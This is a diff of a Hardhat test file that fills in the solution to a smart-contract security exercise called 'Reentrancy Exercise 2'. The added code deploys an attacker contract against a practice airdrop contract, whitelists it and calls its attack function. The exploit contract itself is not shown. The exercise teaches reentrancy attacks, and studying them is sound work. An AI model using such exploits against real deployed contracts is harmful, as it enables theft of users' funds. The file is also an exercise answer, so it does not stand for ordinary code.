@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { parseEther } = require("ethers/lib/utils");
 
 describe('Reentrancy Exercise 2', function () {
 
@@ -19,18 +20,30 @@ describe('Reentrancy Exercise 2', function () {
         );
 
         this.airdrop = await ApesAirdropFactory.deploy();
-        
+
         await this.airdrop.addToWhitelist(users.map(user => user.address));
 
-        for(let i=0; i < users.length; i++) {
+        for (let i = 0; i < users.length; i++) {
             expect(await this.airdrop.isWhitelisted(users[i].address)).to.equal(true);
         }
-        
+
     });
 
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
-        
+
+        const hackerFactory = await ethers.getContractFactory(
+            'contracts/reentrancy-2/Hacker.sol:Hacker',
+            attacker
+        );
+
+        this.hacker = await hackerFactory.deploy(this.airdrop.address);
+
+        await this.airdrop.connect(attacker).grantMyWhitelist(this.hacker.address);
+
+        await this.hacker.attack();
+
+
     });
 
     after(async function () {
